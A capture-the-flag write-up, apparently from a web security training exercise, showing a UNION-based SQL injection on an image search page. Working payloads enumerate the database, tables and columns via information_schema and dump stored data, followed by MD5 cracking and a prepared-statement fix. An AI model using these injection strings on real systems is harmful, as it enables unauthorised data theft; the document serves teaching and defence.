# 06 - SQL Injection Images

## Reproduce

We found an SQL Injection in: `http://{IP}/?page=searchimg`

- Get the database name: `1 AND 0=1 UNION SELECT 1, database()` 
===> `Member_images`

- Get the table name: `1 AND 0=1 UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = char(77,101,109,98,101,114,95,105,109,97,103,101,115)` 
===> `list_images`

- Get columns name: `1 AND 0=1 UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = char(77,101,109,98,101,114,95,105,109,97,103,101,115) AND TABLE_NAME = char(108,105,115,116,95,105,109,97,103,101,115)`
===> 
`
{
    'id',
    'url',
    'title',
    'comment'
}
`

- Let's list the `title + comment` of all the images :
`1 AND 0=1 UNION SELECT title,comment FROM list_images`

In the comment of 'Hack me ?' we found this:
`If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46` 

And that what we did :)
- Decode 1928e8083cf461a51303633093573c46 with MD5 ==> 'albatroz'
- Encode 'albatroz' using Sha256 ==> Tadaaaaaa flag


## Explaination of the vurnability

SQL injection: is a code injection technique that might destroy your database.


## Fix 

- Use of Prepared Statements (with Parameterized Queries) for example in :
    - JAVA EE use: PreparedStatement() with bind variables.
    - PHP use: PDO (PHP Data Object) with strongly typed parameterized queries.
- Don't construct queries with user input whitout verifications.
